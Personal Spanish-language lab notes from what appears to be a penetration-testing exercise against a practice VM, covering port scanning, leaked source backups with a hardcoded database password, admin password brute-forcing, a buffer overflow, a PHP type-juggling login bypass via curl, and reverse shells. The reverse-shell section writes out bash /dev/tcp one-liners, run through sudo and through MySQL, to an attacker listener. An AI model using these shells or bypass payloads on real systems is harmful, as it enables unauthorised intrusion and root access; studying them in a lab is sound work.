Buffer Overflow
Contraseñas malas
Secretos en el código 


var

trafico sin cifrar 

mirar codigo y ver cosas que no sean iguales para encontrar fallos
burpsuite abierto para ver las peticiones que se mandan (no hace falta interceptar, simplemente dejarle pasar y luego ver el historial para ver si vemos algo)


en app2 hay un error que se llama PHP type juggling
app1(o 3, no recuerda) hay 2 fallos: 
- SSTI
- RCE Unpickle
cree: ssti -> app3, rce unpiclke -> app 1

# NMAP 
## TCP
Puertos abiertos:
![[Pasted image 20251203104441.png]]

información más detallada sobre los puertos
![[Pasted image 20251203104625.png]]
Exploración:
**21/tcp (ftp):** Se necesita usuario ya que el acceso anónimo está deshabilitado 
**22/tcp (ssh):** revisar exploit con la versión
**80/tcp:** Apache
**3306/tcp (mysql)**: base de datos con inicio de sesión
**9001/tcp:** puerto python
**55555/tcp closed unknown:** no info revisar puerto
## UDP
![[Pasted image 20251203110814.png]]
# Puertos
## 9001
al entrar a http://192.168.207.130:9001/ podemos ver los directorios y vemos que tenemos para descargar sin uniciar sesión los siguientes archivos
- backup_app1.tar.gz
- backup_app2.tar.gz
- backup_app3.tar.gz
Tras descargar estos archivos podemos ver el codigo de las 3 páginas, una vulnerabilidad bastante importante porque le estás regalando al atacante el código de las páginas web

> [!IMPORTANT]  
> Ver si puedo descargar archivos de la maquina como tal desde aqui

### APP 1
Tras revisar esos archivos podemos ver todos los directorios (url) de las páginas web por lo que somos capaces de sacar todos sin utilizar ninguna herramienta externa como **ffuf**
```
re_path(
        r'^register/$',
        view=views.RegisterView.as_view(),
        name='register'
    ),

    re_path(
        r'^login/$',
        view=views.LoginView.as_view(),
        name='login'
    ),
    re_path(
        r'^logout/$',
        view=views.LogoutView.as_view(),
        name='logout'
    ),
    re_path(
        r'^profile/$',
        view=views.ProfileView.as_view(),
        name='profile'
    ),
    re_path(
        r'^gallery/$',
        view=views.GalleryView.as_view(),
        name='gallery'
    ),
    re_path(
        r'^gallery/image$',
        view=views.GalleryImageView.as_view(),
        name='galleryImage'
    ), 
```
#### Información externa a los comprimidos
Tras tratar de hacer login en http://app1.unie/users/login/ nos salta un error que nos da demasiada información debido a que en la app está puesto el `DEBUG = True`, por este error obtenemos mucha información como 
```
databases:
{'default': {'ATOMIC_REQUESTS': True,
             'AUTOCOMMIT': True,
             'CONN_HEALTH_CHECKS': False,
             'CONN_MAX_AGE': 0,
             'ENGINE': 'django.db.backends.mysql',
             'HOST': 'localhost',
             'NAME': 'app1_database',
             'OPTIONS': {},
             'PASSWORD': '********************',
             'PORT': '',
             'TEST': {'CHARSET': None,
                      'COLLATION': None,
                      'MIGRATE': True,
                      'MIRROR': None,
                      'NAME': None},
             'TIME_ZONE': None,
             'USER': 'app1_user'}}
```
Revisando de nuevo en el .tar de app1 teniendo el nombre de la base de datos encontramos en `/var/www/html/app1/app1/settings/common.py`
```
DATABASES = {
    # Raises ImproperlyConfigured exception if DATABASE_URL not in os.environ
    'default': {
        'ENGINE': 'django.db.backends.mysql',
        'NAME': 'app1_database',
        'USER': 'app1_user',
        'PASSWORD': 'app1_password',
        'HOST': 'localhost',
        'PORT': '',
    }
}
```
sabiendo esta dirección ahora en el resto de apps podemos encontrar lo mismo. 

Como en /users/login independientemente de qe¡ue esté bien o mal te redirige tuve la idea de ir al panel de administrador donde no hay redireccion y podemos comprobarlo lo unico que tambien está protegido por CSRF por lo que cree un script (.py) el cual pasándole la wordlist rockyou.txt sacamos que la contraseña es admin, una contraseña poco segura

### APP 2 
Aqui encontramos directamente el codigo sql que crea la tabla junto a los valores y que tipo son por lo que podríamos ver de hacer sql injection y no tendriamos que estar buscando como se llama la tabla y lo que contiene el usuario y contraseña porque ya tenemos como se llama
```
create table if not exists users (

id char(36) not null default uuid(),

name varchar(255) not null,

email varchar(255) not null,

passwd varchar(255) not null,

primary key(id)

);

  

create table if not exists books (

id char(36) not null default uuid(),

title varchar (155) not null,

year_created YEAR not null,

user_id char(36) not null,

primary key (id),

foreign key (user_id) references users (id)

);
```

> [!WARNING]  
> Recordemos que todas esta información la adquirimos sin acceder a la máquina directamente, cualquier ciberdelincuente puede acceder a esta información
> 


# 5555
Estando en la máquina reviso los procesos relacionados con app con
```bash
ps aux | grep -i app
```
lo que nos da
```bash
user@user-VMware-Virtual-Platform:~$ ps aux | grep -i app
root        1843  0.0  0.0   9288  3788 ?        Ss   11:42   0:00 socat TCP-LISTEN:5555,fork,reuseaddr, exec:/opt/app5/app5,stderr
user        3855  0.5  1.9 243036 75504 ?        S    11:42   0:00 /usr/bin/Xwayland :0 -rootless -noreset -accessx -core -auth /run/user/1000/.mutter-Xwaylandauth.STG8F3 -listenfd 4 -listenfd 5 -displayfd 6 -initfd 7 -byteswappedclients
user        4068  1.7  1.6 3214480 64164 ?       Sl   11:42   0:00 gjs /usr/share/gnome-shell/extensions/ding@rastersoft.com/app/ding.js -E -P /usr/share/gnome-shell/extensions/ding@rastersoft.com/app
user        4170  1.0  1.5 1056256 63044 ?       Sl   11:42   0:00 /usr/bin/gnome-calendar --gapplication-service
user        4468  0.0  0.0   9144  2248 pts/0    S+   11:42   0:00 grep --color=auto -i app
```
por lo que vemos en 
```bash
root        1843  0.0  0.0   9288  3788 ?        Ss   11:42   0:00 socat TCP-LISTEN:5555,fork,reuseaddr, exec:/opt/app5/app5,stderr
```
parece un servicio personalizado que ejecuta /opt/app5/app5 por lo que revisamos el archivo y sus permisos
```bash
user@user-VMware-Virtual-Platform:~$ file /opt/app5/app5
/opt/app5/app5: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=6794c42ba9fce64417f4fc13d5be2017ef50bbb0, for GNU/Linux 3.2.0, with debug_info, not stripped
user@user-VMware-Virtual-Platform:~$ ls -la /opt/app5/app5
-rwxr-xr-x 1 root root 15688 Sep 29 14:55 /opt/app5/app5
```
con esto confirmamos que es x86-64 bit, usa librerías compartidas, tiene debug activado y si logramos explotarlo podemos tener acceso como root

Antes de nada primero reviso si puedo interactar con el poniendo
```
nc localhost 5555
```
y luego escribiendo cualquier cosa recibiendo


Tambien revisamos el codigo fuente
![[Pasted image 20251118122743.png]]

Ahora vamos a revisar el archivo con gbd
```bash
gdb /opt/app5/app5
info functions
disas main
```
![[Pasted image 20251118120931.png]]
![[Pasted image 20251118120436.png]]
![[Pasted image 20251118120524.png]]
Aqui lo más importante es que lee la entrada con scanf para leer la entrada, pero tambien tenemos que el main es visible y que tiene un buffer de 512 bytes y con GNU_STACK podriamos ejecutar shellcode
Ahora vamos a comprobar si hay buffer ovweflow con 
```
python3 -c "print('A' * 600)" | nc localhost 5555
```
y tras ponerlo vemos que ahora no sale el texto que salia antes por lo que lo confirmamos
![[Pasted image 20251118121221.png]]


Probando encontramos una **vulnerabilidad** tipo **Format String Vulnerability**



# Reverse shell
Para reverse shell he encontrado 2 formas de hacerlo:
## 1. Directamente por SSH
en este caso no tenemos ni que poner sudo, cosa que está mal ya que poniendo unicamente bash -c 'bash -i >& /dev/tcp/192.168.207.1/4444 0>&1'
aunque en este caso no estamos como root sino que estamos como user
![[Pasted image 20251203094526.png]]
y viendo sudo -l vemos que tenemos permisos con este usuario para hacer de todo por lo que si queremos uqe la reverse shell sea desde un inicio como root para no tener que ir poniendo sudo podemos poner sudo bash -c 'bash -i >& /dev/tcp/192.168.207.1/4444 0>&1'
## 2. A través de SQL
conectandonos a la maquina por ssh con ssh user@192.168.207.130 accedemos como user aunque tenemos permiso de sudo, igualmente podemos hacer una reverse shell para estar como root ya que están mal configurados los permisos de sql, antes de nada tenemos que ponernos a escuchar por el puerto que queramos (en este caso el 4444) con
ncat -nlvp 4444
despues en la terminal en la que estamos por ssh:
sudo mysql (conectarnos a sql)
system bash -c "bash -i >& /dev/tcp/192.168.207.1/4444 0>&1"

con esto en la terminal donde ponemos ncat nos llega 
![[Pasted image 20251203094003.png]]
donde vemos que tenemos permiso de root y estamos efectivamente dentro de la maquina

# PHP type juggling
Primero reviso el código de la parte del login para saber como tengo que rellenarlo
![[Pasted image 20251203100647.png]]
Primero revisamos la respuesta cuando ponemos un mail y contraseña correctos
![[Pasted image 20251203100938.png]]
y vemos que poniendo
```bash
curl -X POST http://app2.unie/v2/users/login -H "Content-Type: application/json" -d '{"email":"admin@app2.unie","password":true}'
```
nos devuelve lo correcto por lo que confirmamos que hay **PHP type juggling**
![[Pasted image 20251203101135.png]]
(todo esto se puede hacer con la peticion de login encontrada en http://app2.unie/docs/ utilizando burpsuite)

# RCE Unpickle
El codigo relacionado con esto se encuentrea en /var/www/html/app1/users/views.py , exactamente en la linea 84 de la clase profileview
![[Pasted image 20251203102909.png]]
ahora que confirmamos que está lo explotamos







> [!NOTE]  
> Highlights information that users should take into account, even when skimming.

> [!TIP]
> Optional information to help a user be more successful.

> [!IMPORTANT]  
> Crucial information necessary for users to succeed.

> [!WARNING]  
> Critical content demanding immediate user attention due to potential risks.

> [!CAUTION]
> Negative potential consequences of an action.

smartcard, raduis,  donaub yser abd m. active no se que 1 y 2, vpn, pki, token and lock down devices


sudo tcpdump -i <interfaz(lo)> icmp


para reverse shell rlwarp ... mirar cheat sheet
